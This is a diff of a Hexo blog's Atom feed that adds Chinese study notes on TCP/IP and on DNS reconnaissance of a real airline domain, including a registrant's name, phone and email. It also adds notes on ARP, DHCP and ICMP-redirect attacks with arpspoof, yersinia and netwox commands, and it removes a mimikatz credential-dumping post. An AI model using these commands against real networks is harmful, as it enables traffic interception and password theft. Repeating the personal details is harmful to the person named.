@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-12-20T15:26:13.586Z</updated>
+  <updated>2018-12-23T07:58:12.051Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,78 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>TCP/IP</title>
+    <link href="http://yoursite.com/2018/12/23/TCP-IP/"/>
+    <id>http://yoursite.com/2018/12/23/TCP-IP/</id>
+    <published>2018-12-23T07:11:57.000Z</published>
+    <updated>2018-12-23T07:58:12.051Z</updated>
+    
+    <content type="html"><![CDATA[<p>TCP/IP 协议栈是一系列网络协议的总和，是构成网络通信的核心骨架，它定义了电子设备如何连入因特网，以及数据如何在它们之间进行传输。</p><p>TCP/IP采用四层结构，分别是应用层、传输层、网络层和链路层。</p><p>每一层都需要他的下一层所提供的协议来完成自己的需求。</p><p>TCP/IP的工作原理：一个主机的数据要经过哪些过程才能发送到对方的主机上。</p><h1 id="物理介质"><a href="#物理介质" class="headerlink" title="物理介质"></a>物理介质</h1><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fygpaamw92j30i00f6t9b.jpg" alt=""></p><p>当通过http发起一个请求时，应用层、传输层、网络层和链路层的相关协议依次对该请求进行包装并携带对应的首部，最终在链路层生成以太网数据包，以太网数据包通过物理介质传输给对方主机，对方接收到数据包以后，然后再一层一层采用对应的协议进行拆包，最后把应用层数据交给应用程序处理。</p><p>配送车就是物理介质，配送站就是网关， 快递员就是路由器，收货地址就是IP地址，联系方式就是MAC地址。 </p><h1 id="链路层"><a href="#链路层" class="headerlink" title="链路层"></a>链路层</h1><p>网络通信就是把有特定意义的数据通过物理介质传送给对方，单纯的发送0和1是没有意义的，要传输有意义的数据，就需要以字节为单位对 0 和 1 进行分组，并且要标识好每一组电信号的信息特征，然后按照分组的顺序依次发送。以太网规定一组电信号就是一个数据包，一个数据包被称为一帧， 制定这个规则的协议就是以太网协议。</p><p>以太网规协议定，接入网络的设备都必须安装网络适配器，即网卡， 数据包必须是从一块网卡传送到另一块网卡。而网卡地址就是数据包的发送地址和接收地址，也就是帧首部所包含的MAC地址，MAC地址是每块网卡的身份标识，就如同我们身份证上的身份证号码，具有全球唯一性。</p><p>有了MAC地址以后，以太网采用广播形式，把数据包发给该子网内所有主机，子网内每台主机在接收到这个包以后，都会读取首部里的目标MAC地址，然后和自己的MAC地址进行对比，如果相同就做下一步处理，如果不同，就丢弃这个包。</p><p><strong>所以链路层的主要工作就是对电信号进行分组并形成具有特定意义的数据帧，然后以广播的形式通过物理介质发送给接收方。</strong></p><h1 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h1><p>发送者如何知道接收者的MAC地址？ <strong>ARP协议</strong></p><p>发送者如何知道接收者和自己同属一个子网？ <strong>IP协议</strong></p><p>如果接收者和自己不在同一个子网，数据包如何发给对方？ <strong>路由协议</strong></p><h2 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h2><p>MAC地址只与厂商有关，与所处的网络无关，所以无法通过MAC地址来判断两台主机是否属于同一个子网。</p><p>因此，网络层引入了IP协议，制定了一套新地址，使得我们能够区分两台主机是否同属一个网络，这套地址就是网络地址，也就是所谓的IP地址。</p><p>IP地址目前有两个版本，分别是IPv4和IPv6，IPv4是一个32位的地址，常采用4个十进制数字表示。IP协议将这个32位的地址分为两部分，前面部分代表网络地址，后面部分表示该主机在局域网中的地址。为了判断IP地址中的网络地址，IP协议还引入了子网掩码， IP地址和子网掩码通过按位与运算后就可以得到网络地址。</p><p>以C类地址<code>192.168.24.1</code>为例，其中前24位就是网络地址，后8位就是主机地址。<strong>如果两个IP地址在同一个子网内，则网络地址一定相同</strong></p><h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2><p>地址解析协议，是根据IP地址获取MAC地址的一个网络层协议。</p><h3 id="工作原理："><a href="#工作原理：" class="headerlink" title="工作原理："></a>工作原理：</h3><p>ARP首先会发起一个请求数据包，数据包首部包含了目标主机的IP地址，然后这个数据包会在数据链路层进行再次包装，生成以太网数据包，最终由以太网广播给子网内的所有主机，每一台主机都会接收到这个数据包，并取出标头中的IP地址，然后和自己的IP地址进行比较，如果相同就返回自己的MAC地址，如果不同就丢弃该数据包。ARP接收返回信息，以此来确定目标机的MAC地址，与此同时，ARP还会将返回的MAC地址与对应的IP地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。</p><h2 id="路由协议"><a href="#路由协议" class="headerlink" title="路由协议"></a>路由协议</h2><p>通过ARP协议原理可以知道，ARP的MAC寻址局限在同一子网中，因此网络层引入了路由协议，首先通过IP协议来判断两台主机是否在同一子网中，如果在同一子网中就通过ARP协议查询相应的MAC地址，然后以广播的形式向该子网内的主机发送数据包。</p><p>如果不在同一个子网，以太网就会将该数据包转发给本子网的网关进行路由。网关是互联网子网与子网之间的桥梁，所以网关会进行多次转发，最终将数据包转发到目标IP所在的子网中，然后再通过ARP获取目标机MAC，最终也是通过广播形式将数据包发送给对方。</p><p>而完成这个路由协议的物理设备就是路由器，在错综复杂的网络世界里，路由器扮演者交通枢纽的角色，它会根据信道情况，选择并设定路由，以最佳路径来转发数据包。</p><p><strong>网络层的主要工作是定义网络地址，区分网段，子网内MAC寻址，对于不同子网的数据包进行路由。</strong></p><h1 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h1><p>链路层定义了主机的身份，即MAC地址， 而网络层定义了IP地址，明确了主机所在的网段，有了这两个地址，数据包就从可以从一个主机发送到另一台主机。但实际上数据包是从一个主机的某个应用程序发出，然后由对方主机的应用程序接收。而每台电脑都有可能同时运行着很多个应用程序，所以当数据包被发送到主机上以后，是无法确定哪个应用程序要接收这个包。</p><p>因此传输层引入了UDP协议来解决这个问题，为了给每个应用程序标识身份，UDP协议定义了端口，同一个主机上的每个应用程序都需要指定唯一的端口号，并且规定网络中传输的数据包必须加上端口信息。 这样，当数据包到达主机以后，就可以根据端口号找到对应的应用程序了。</p><p>为了保证传输的可靠性，TCP 协议在 UDP 基础之上建立了三次对话的确认机制，也就是说，在正式收发数据前，必须和对方建立可靠的连接。</p><p>TCP 能够保证数据包在传输过程中不被丢失，但美好的事物必然是要付出代价的，相比 UDP，TCP 实现过程复杂，消耗连接资源多，传输速度慢。</p><p><strong>传输层的主要工作是定义端口，标识应用程序身份，实现端口到端口的通信，TCP协议可以保证数据传输的可靠性。</strong></p><h1 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h1><p>理论上讲，有了以上三层协议的支持，数据已经可以从一个主机上的应用程序传输到另一台主机的应用程序了，但此时传过来的数据是字节流，不能很好的被程序识别，操作性差。因此，应用层定义了各种各样的协议来规范数据格式，常见的有 HTTP、FTP、SMTP 等，HTTP 是一种比较常用的应用层协议，主要用于B/S架构之间的数据通信。</p><p>有了这个规范以后，服务端收到请求以后，就能正确的解析客户端发来的数据，当请求处理完以后，再按照客户端要求的格式返回，客户端收到结果后，按照服务端返回的格式进行解析。</p><p><strong>应用层的主要工作就是定义数据格式并按照对应的格式解读数据。</strong></p><h1 id="全流程"><a href="#全流程" class="headerlink" title="全流程"></a>全流程</h1><ul><li>链路层：对0和1进行分组，定义数据帧，确认主机的物理地址，传输数据；</li><li>网络层：定义IP地址，确认主机所在的网络位置，并通过IP进行MAC寻址，对外网数据包进行路由转发；</li><li>传输层：定义端口，确认主机上应用程序的身份，并将数据包交给对应的应用程序；</li><li>应用层：定义数据格式，并按照对应的格式解读数据。</li></ul><p><strong>用一句通俗易懂的话讲就是：</strong></p><p>当你输入一个网址并按下回车键的时候，首先，应用层协议对该请求包做了格式定义；紧接着传输层协议加上了双方的端口号，确认了双方通信的应用程序；然后网络协议加上了双方的IP地址，确认了双方的网络位置；最后链路层协议加上了双方的MAC地址，确认了双方的物理位置，同时将数据进行分组，形成数据帧，采用广播方式，通过传输介质发送给对方主机。而对于不同网段，该数据包首先会转发给网关路由器，经过多次转发后，最终被发送到目标主机。目标机接收到数据包后，采用对应的协议，对帧数据进行组装，然后再通过一层一层的协议进行解析，最终被应用层的协议解析并交给服务器处理。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;TCP/IP 协议栈是一系列网络协议的总和，是构成网络通信的核心骨架，它定义了电子设备如何连入因特网，以及数据如何在它们之间进行传输。&lt;/p&gt;
+&lt;p&gt;TCP/IP采用四层结构，分别是应用层、传输层、网络层和链路层。&lt;/p&gt;
+&lt;p&gt;每一层都需要他的下一层所提供的协议来完成自己
+      
+    
+    </summary>
+    
+      <category term="网络及协议" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>信息收集--DNS、IP</title>
+    <link href="http://yoursite.com/2018/12/23/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-DNS%E3%80%81IP/"/>
+    <id>http://yoursite.com/2018/12/23/信息收集-DNS、IP/</id>
+    <published>2018-12-23T05:50:40.000Z</published>
+    <updated>2018-12-23T07:04:30.402Z</updated>
+    
+    <content type="html"><![CDATA[<p>域名系统（英文：Domain Name System，DNS）是因特网的一项服务，它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便的访问互联网。DNS 使用TCP和UDP端口53。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。</p><p>当个人或者企业实体注册域名时需要注册许多信息，注册隐私的设置各种各样，我们可以搜集这些信息并用来验证IP空间。根据这个线索，可以寻找属于该个人或者企业实体的其他网站信息，甚至于核心员工的号码和地址。</p><h1 id="与DNS相关的命令使用"><a href="#与DNS相关的命令使用" class="headerlink" title="与DNS相关的命令使用"></a>与DNS相关的命令使用</h1><ul><li>Host（host domain，host-vdomain）</li><li>nslookup</li><li>dig</li><li>whois</li></ul><h1 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h1><h2 id="域名查询"><a href="#域名查询" class="headerlink" title="域名查询"></a>域名查询</h2><p>使用<code>whois</code>命令对域名进行查询。</p><p>例如：</p><pre><code>whois ceair.com</code></pre><p>从中信息中发现一个新域名：<code>ce-air.com</code></p><p>继续用whois进行查询</p><p>得到<code>Registrant Name:chenchang Registrant Organization:china easter, airlines Registrant Street:No 2550 Rd hongqiao Registrant City:shixiaqu Registrant State/Province:shanghaishi Registrant Postal Code:200335 Registrant Country:CN Registrant Phone:+86.13818632527 Registrant Phone Ext: Registrant Fax:+86.13818632527 Registrant Fax Ext: Registrant Email:cchen@ceair.com</code></p><p>其中有比较重要的邮箱、电话号码、姓名。</p><p>然后在<a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a>中提供的几个反查工具中进一步查询。</p><p>又发现一个新域名</p><p><code>eaglevision-china.com</code></p><p>这样就可以获得很多有用信息。</p><h1 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h1><pre><code>nslookset type=Awww.ceair.com</code></pre><h1 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h1><pre><code>dig ceair.com</code></pre><p>查询NS记录：</p><pre><code>dig ceair.com NS</code></pre><p>查询TXT记录：</p><pre><code>dig +noall +answer ceair.com TXT</code></pre><h1 id="DNS子域名爆破工具"><a href="#DNS子域名爆破工具" class="headerlink" title="DNS子域名爆破工具"></a>DNS子域名爆破工具</h1><p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></p><pre><code>python .\subDomainsBrute.py --full -t 10 ceair.com</code></pre><p>通过子域名的爆破，可以进一步明确企业网络资产（有哪些域名、域名对应什么系统、域名集中的C段地址等等），这是攻击者、防御者都需要时刻关注的方面。</p><h1 id="利用多地Ping工具，查看域名真实IP"><a href="#利用多地Ping工具，查看域名真实IP" class="headerlink" title="利用多地Ping工具，查看域名真实IP"></a>利用多地Ping工具，查看域名真实IP</h1><p>一些站点为了能够让用户获得更好的体验与提高安全性，会采用CDN技术对网站进行加速，因此在使用nslookup等工具进行本地查询时，可能无法获取到网站的真实IP地址。</p><p>这种情况下，通常采用多个地点对网站进行访问，查看解析结果的方式来确定是否使用CDN。</p><p>在浏览器中输入<code>http://ping.chinaz.com/ceair.com</code></p><p>可以片中看出，该归属地、运营商、ASN数据等信息。</p><h1 id="针对部分IP进行信息收集"><a href="#针对部分IP进行信息收集" class="headerlink" title="针对部分IP进行信息收集"></a>针对部分IP进行信息收集</h1><p>通过上述两个步骤，可以将确定的集中在某一C段IP进行查询，确定是否属于该企业。</p><p>选取子域名爆破结果中多次出现的一个IP（C段）： <code>whois 218.1.115.23</code></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;域名系统（英文：Domain Name System，DNS）是因特网的一项服务，它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便的访问互联网。DNS 使用TCP和UDP端口53。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。
+      
+    
+    </summary>
+    
+      <category term="信息收集" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>网络及协议安全</title>
+    <link href="http://yoursite.com/2018/12/23/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8/"/>
+    <id>http://yoursite.com/2018/12/23/网络及协议安全/</id>
+    <published>2018-12-23T05:37:28.000Z</published>
+    <updated>2018-12-24T14:29:36.626Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h1><p>在网络中进行数据通信，在什么情况下发送什么样的数据，要有一定的规则，这些规则或者约定就是协议，也叫网络协议。</p><h2 id="协议的组成"><a href="#协议的组成" class="headerlink" title="协议的组成"></a>协议的组成</h2><ul><li>同步：实现顺序的详细说明</li><li>语法：发送数据或者控制信息的格式</li><li>语义：根据控制信息，做出的响应</li></ul><h1 id="ARP协议攻击和防御"><a href="#ARP协议攻击和防御" class="headerlink" title="ARP协议攻击和防御"></a>ARP协议攻击和防御</h1><h2 id="ARP协议漏洞"><a href="#ARP协议漏洞" class="headerlink" title="ARP协议漏洞"></a>ARP协议漏洞</h2><p>ARP协议是建立在信任局域网内所有节点的基础上的，他的效率很高。但是不安全。它是无状态的协议。他不会检查自己是否发过请求包，也不知道自己是否发过请求包。他也不管是否合法的应答，只要收到目标mac地址是自己的ARP reply或者ARP广播包（包括ARP reply和ARP request），<br>都会接受并缓存。</p><h2 id="ARP攻击原理"><a href="#ARP攻击原理" class="headerlink" title="ARP攻击原理"></a>ARP攻击原理</h2><p><strong>ARP欺骗攻击建立在局域网主机间相互信任的基础上的</strong></p><p>当A发广播询问：我想知道IP是192.168.0.3的硬件地址是多少？</p><p>此时B当然会回话：我是IP192.168.0.3我的硬件地址是mac-b，</p><p>可是此时IP地址是192.168.0.4的C也非法回了：我是IP192.168.0.3,我的硬件地址是mac-c。而且是大量的。</p><p>所以A就会误信192.168.0.3的硬件地址是mac-c，而且动态更新缓存表</p><p>这样主机C就劫持了主机A发送给主机B的数据，这就是ARP欺骗的过程。</p><p>假如C直接冒充网关，此时主机C会不停的发送ARP欺骗广播，大声说：我的ＩＰ是１９２.１６８.０.１，我的硬件地址是ｍａｃ－ｃ，</p><p>此时局域网内所有主机都被欺骗，更改自己的缓存表，此时Ｃ将会监听到整个局域网发送给互联网的数据报。</p><h2 id="ARP欺骗攻击的方式"><a href="#ARP欺骗攻击的方式" class="headerlink" title="ARP欺骗攻击的方式"></a>ARP欺骗攻击的方式</h2><ul><li>cain</li><li>arpspoof【<code>arpspoof -i eth0 -t 目标IP 网关IP</code>       # ARP欺骗】</li><li>ettercap</li></ul><h2 id="ARP攻击的症状"><a href="#ARP攻击的症状" class="headerlink" title="ARP攻击的症状"></a>ARP攻击的症状</h2><ul><li>打开网页很慢，甚至打不开</li><li>提示IP地址冲突</li><li>键入<code>arp -a</code>查看缓存表，如果发现网关的MAC地址发生了改变，或者发现有很多IP指向同一个物理地址</li></ul><h2 id="ARP攻击的检测"><a href="#ARP攻击的检测" class="headerlink" title="ARP攻击的检测"></a>ARP攻击的检测</h2><ul><li>通过命令查看主机的ARP表或路由器的ARP表</li><li>用wireshark抓包查看可以&lt;IP,MAC&gt;地址映射</li><li>ARP防火墙安全日志</li></ul><h2 id="ARP攻击的防御"><a href="#ARP攻击的防御" class="headerlink" title="ARP攻击的防御"></a>ARP攻击的防御</h2><ul><li>设置静态ARP缓存表</li><li>专用VLan</li><li>交换机端绑定</li><li>安装ARP防火墙</li><li>通过”arp -d“清除arp列表，重新访问（临时方法）</li><li>将DHCP服务器建立在网关上（ARP攻击一般先攻击网关）</li><li>实在不行使用代理</li></ul><h2 id="找出ARP病毒主机"><a href="#找出ARP病毒主机" class="headerlink" title="找出ARP病毒主机"></a>找出ARP病毒主机</h2><p>下载<code>NBTSCAN</code>，他可以扫描到PC的真实IP地址和MAC地址。</p><h1 id="DHCP协议攻击和防御"><a href="#DHCP协议攻击和防御" class="headerlink" title="DHCP协议攻击和防御"></a>DHCP协议攻击和防御</h1><h2 id="DHCP的工作流程"><a href="#DHCP的工作流程" class="headerlink" title="DHCP的工作流程"></a>DHCP的工作流程</h2><p> ①首先由客户端以广播方式发出“DHCP Discover”报文来寻找网络中的DHCP服务端。</p><p>②当服务端接收到来自客户端的“DHCP Discover”报文后，就在自己的地址池中查找是否有可提供的IP地址。如果有，服务端就将此IP地址做上标记，并用“DHCP Offer”报文将之发送回客户端。</p><p>③由于网络中可能会存在多台DHCP服务端，所以客户端可能会接收到多个“DHCP Offer”报文。此时客户端只选择最先到达的“DHCP Offer”，并再次以广播方式发送“DHCP Request”报文。一方面要告知它所选择的服务端，同时也要告知其它没有被选择的服务端，这样这些服务端就可以将之前所提供的IP地址收回。</p><p>④被选择的服务端接收到客户端发来的“DHCP Request”报文后，首先将刚才所提供的IP地址标记为已租用，然后向客户端发送一个“DHCP Ack”确认报文，该报文中包含有IP地址的有效租约以及默认网关和DNS服务器等网络配置信息。</p><p>当客户端收到“DHCP ACK”报文后，就成功获得了IP地址，完成了初始化过程。</p><h2 id="DHCP服务欺骗和报文泛洪攻击"><a href="#DHCP服务欺骗和报文泛洪攻击" class="headerlink" title="DHCP服务欺骗和报文泛洪攻击"></a>DHCP服务欺骗和报文泛洪攻击</h2><p>利用yersinia耗尽IP资源</p><pre><code>sending RAW packetsending DISCOVER packetcreating DHCPsending RELEASE packet</code></pre><h3 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a>防护措施</h3><ul><li>DHCP Snooping功能只能防止假冒攻击，而无法防止耗尽攻击。这是由于耗尽攻击所采用的都是客户端正常发送的DHCP Discover报文，因而DHCP Snooping对其无能为力。</li><li>可以通过交换机的Port-Security(端口安全性)功能来防范耗尽攻击。因为Yersinia伪造的每个DHCPDiscover报文的源MAC地址都是不同的，在交换机中执行<code>showmac-address-table</code>命令查看MAC地址表，就会发现在攻击机所连接的端口上产生了大量的MAC地址表条目，我们可以限定每个端口的最大MAC地址数量。</li><li>DHCP VACL</li><li>启用ARP入侵检测功能</li><li>使用IP过滤功能</li><li>DHCP报文限速。</li></ul><h1 id="MAC泛洪攻击"><a href="#MAC泛洪攻击" class="headerlink" title="MAC泛洪攻击"></a>MAC泛洪攻击</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>交换机中存在着一张记录着MAC地址的表，为了完成数据的快速转发，该表具有自动学习机制；泛洪攻击即是攻击者利用这种学习机制不断发送不同的MAC地址给交换机，充满整个MAC表，此时交换机只能进行数据广播，攻击者凭此获得信息。</p><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><ul><li>伪造大量的未知MAC地址进行通信</li><li>MAC表就会被充满</li><li>正常主机的MAC地址老化之后，无法再添加到MAC表</li></ul><h2 id="攻击工具"><a href="#攻击工具" class="headerlink" title="攻击工具"></a>攻击工具</h2><p>进行MAC泛洪攻击的工具——macof：</p><ul><li>使交换机的MAC表溢出</li><li>对于以后收到的数据包以广播方式发送</li><li>泛洪之前就存在与交换机MAC表中的条目不会被覆盖，只能等到这些条目自然老化</li></ul><h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ul><li>限制相应端口通信MAC地址数目</li><li>设置端口关闭定时器</li></ul><h1 id="IP源地址欺骗"><a href="#IP源地址欺骗" class="headerlink" title="IP源地址欺骗"></a>IP源地址欺骗</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>IP 欺骗技术就是伪造某台主机的IP地址的技术。通过IP 地址的伪装使得某台主机能够伪装另外的一台主机，而这台主机往往具有某种特权或者被另外的主机所信任。假设现在有一个合法用户(1.1.1.1)已经同服务器建立正常的连接，攻击者构造攻击的TCP数据，伪装自己的IP 为1.1.1.1，并向服务器发送一个带有RSI位的TCP数据段。服务器接收到这样的数据后，认为从1.1.1.1发送的连接有错误，就会清空缓冲区中建立好的连接。这时，如果合法用户1.1.1.1再发送合法数据，服务器就已经没有这样的连接了，该用户就必须从新开始建立连接。攻击时，伪造大量的IP地址，向目标发送RST数据，使服务器不对合法用户服务。虽然IP地址欺骗攻击有着相当难度，但我们应该清醒地意识到，这种攻击非常广泛，入侵往往从这种攻击开始。</p><ul><li>隐藏发送者身份</li><li>假冒其他计算机</li></ul><h2 id="IP欺骗原理"><a href="#IP欺骗原理" class="headerlink" title="IP欺骗原理"></a>IP欺骗原理</h2><p>只使用数据包中的目标地址进行路由转发，不对源地址进行真实性的验证。</p><p>IP地址被用来在网络和计算机之间发送及接收信息，因此，每个信息包里都包含了IP地址，这样双方才能发送到正确的对方，对方也才能知道来源是正确的。</p><p>当IP欺骗被使用的时候，包里面的就不再是真实的IP，取而代之的是伪造的IP地址，这样，看上去包就是由那个IP发出的，如果对方回复这个信息，那么数据将会被发送到伪造的IP上，除非黑客重定向该信息到一个真实的IP上。</p><h2 id="为什么要IP欺骗"><a href="#为什么要IP欺骗" class="headerlink" title="为什么要IP欺骗"></a>为什么要IP欺骗</h2><p>IP欺骗被用来从事非法活动，破坏网络安全，黑客使用IP欺骗就不会被抓到，还有一些黑客进行Dos攻击的时候，就可以隐藏真实的IP，这样攻击者就无法查到。IP欺骗有时候也可以用来被克隆某个内部网中的信息，这样有时候就可以避免开户名和密码验证而直接登录系统。</p><h2 id="IP源地址欺骗技术的应用"><a href="#IP源地址欺骗技术的应用" class="headerlink" title="IP源地址欺骗技术的应用"></a>IP源地址欺骗技术的应用</h2><ul><li>拒绝服务攻击</li><li>网络扫描【<code>nmap -D</code>用一组肉机IP地址掩盖真实地址、Spoofer、Yersina 】</li></ul><h2 id="IP源地址欺骗防御"><a href="#IP源地址欺骗防御" class="headerlink" title="IP源地址欺骗防御"></a>IP源地址欺骗防御</h2><ul><li>使用随机化的初始序列号</li><li>抛弃基于地址的信任策略：阻止IP欺骗攻击的一种容易的办法就是放弃以地址为基础的验证。不允许r类远程调用命令的使用;删除<code>.rhosts</code>文件;清空<code>/etc/hosts.equiv</code>文件。这将迫使所有用户使用其他远程通信手段，如Telnet、ssh、skey等等。</li><li>使用加密方法：在包发送到网络之前，我们可以对它进行加密。虽然加密过程要求适当改变目前的网络环境，但它将保证数据的完整性和真实性。【IPsec】</li><li>进行包过滤：可以配置路由器使其能够拒绝网络外部和本网内具有相同IP地址的连接请求。而且，当包的IP地址不在本网内，路由器不应该把本网主 机的包发送出去。</li><li>在路由转发表中查找对应的转发接口是否与入接口匹配（检查数据包的源）</li></ul><h1 id="ICMP重定向攻击"><a href="#ICMP重定向攻击" class="headerlink" title="ICMP重定向攻击"></a>ICMP重定向攻击</h1><h2 id="ICMP重定向"><a href="#ICMP重定向" class="headerlink" title="ICMP重定向"></a>ICMP重定向</h2><p><img src="https://img.colabug.com/2017/08/0846817c46cbc3b3347b66f0802b71ae.png" alt=""></p><p>如上图，当主机A向主机B发送一个请求时，先通过默认网关（路由R2）发起请求（蓝色虚线），而这时R2发现通过自己到达主机B并非最佳路径，通过路由R1到达主机B的路径更短，于是这时路由R2就会向主机A发送ICMP重定向报文，让主机A下次请求主机B时通过路由R1走，不要从路由R2走。这时主机A就会在自己的路由表中将到达主机B的下一跳地址改成路由R1。</p><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>正常的网关可以向主机发送重定向报文，那么我们只要伪造网关发送重定向报文，就能使得被攻击者在下次发起请求时将数据包发送至错误的网关。这样可以使被攻击者断网或者窃听其流量数据。</p><p><img src="https://img.colabug.com/2017/08/6520c392f8a148b6e912981090dbefe2.png" alt=""></p><p>攻击的关键点是要抓取到主机A向路由R1发送的数据包，在wlan下数据报都是广播发送，所以攻击者的网卡只需要开启混杂模式，就能抓取到主机A向路由R1发送的包。</p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>冒充网关IP地址，向被攻击节点发送ICMP重定向报文（将指定的新路由器IP地址设置为攻击节点。）</p><p>被攻击节点接受到该报文后会进行限制条件检查。（选择攻击节点作为新路由器）</p><p>攻击节点可以开启路由转发充当中间人（全程嗅探监听）</p><h2 id="攻击实践"><a href="#攻击实践" class="headerlink" title="攻击实践"></a>攻击实践</h2><p>利用Netwox的第86号工具</p><pre><code>netwox 86 -f -&quot;host 192.168.1.105&quot; -g 192.168.1.100 -i 192.168.1.1</code></pre><h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><p>网关端：</p><ul><li>关闭ICMP重定向</li><li>变长子网掩码划分网段</li><li>使用网络控制列表ACL和代理</li></ul><p>主机端：</p><ul><li>可以使用防火墙等过滤掉ICMP报文或使用反间谍软件监控。</li><li>结合防ARP、IP欺骗等进行防御</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;协议&quot;&gt;&lt;a href=&quot;#协议&quot; class=&quot;headerlink&quot; title=&quot;协议&quot;&gt;&lt;/a&gt;协议&lt;/h1&gt;&lt;p&gt;在网络中进行数据通信，在什么情况下发送什么样的数据，要有一定的规则，这些规则或者约定就是协议，也叫网络协议。&lt;/p&gt;
+&lt;h2 id=&quot;协议的
+      
+    
+    </summary>
+    
+      <category term="网络及协议" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>PHP代码审计</title>
@@ -436,78 +508,6 @@ whoami /priv 查看当前用户的权限
     </summary>
     
       <category term="内网渗透工具" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>密码提取神器--mimikatz</title>
-    <link href="http://yoursite.com/2018/12/05/%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E7%A5%9E%E5%99%A8-mimikatz/"/>
-    <id>http://yoursite.com/2018/12/05/密码提取神器-mimikatz/</id>
-    <published>2018-12-05T06:57:03.000Z</published>
-    <updated>2018-12-06T13:42:22.766Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="mimikatz抓取用户密码"><a href="#mimikatz抓取用户密码" class="headerlink" title="mimikatz抓取用户密码"></a>mimikatz抓取用户密码</h2><p><a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.1.1-20181203" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/releases/tag/2.1.1-20181203</a></p><p>mimikatz是由C语言编写的开源小工具，于2014年4月发起。它的功能非常强大，支持从Windows系统内存中提取明文密码、哈希、PIN码和Kerberos凭证，以及pass-the-hash、pass-the-ticket、build Golden tickets等数种黑客技术。</p><p>mimikatz使用起来也非常简单，提取Windows系统的明文密码只需两行命令：</p><pre><code>privilege::debug #提升权限sekurlsa::logonpasswords #抓取密码</code></pre><blockquote><p>输入aaa::aaa，可展示所有模块</p></blockquote><p>可采用log命令，保存为日志</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxvwgt2walj30wh0hhmy1.jpg" alt=""></p><blockquote><p>要以管理员身份进入mimikatz</p></blockquote><p>用cmd5去爆破NTML值</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxvwi10mj0j30kk099dfw.jpg" alt=""></p><p>要钱，算了….</p><p>修改注册表，启用摘要密码支持</p><p>需要创建UseLogonCredential，并赋值为1</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxvwtjmhb7j30hf0eb0tf.jpg" alt=""></p><p>重新登录后，再次运行就可以抓取到明文密码啦。</p><h2 id="mimikatz令牌窃取"><a href="#mimikatz令牌窃取" class="headerlink" title="mimikatz令牌窃取"></a>mimikatz令牌窃取</h2><p>Windows有两种类型的Token：</p><ul><li>Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)</li><li>Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)</li></ul><blockquote><p>两种token只在系统重启后清除</p></blockquote><blockquote><p>具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效</p></blockquote><h3 id="使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token"><a href="#使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token" class="headerlink" 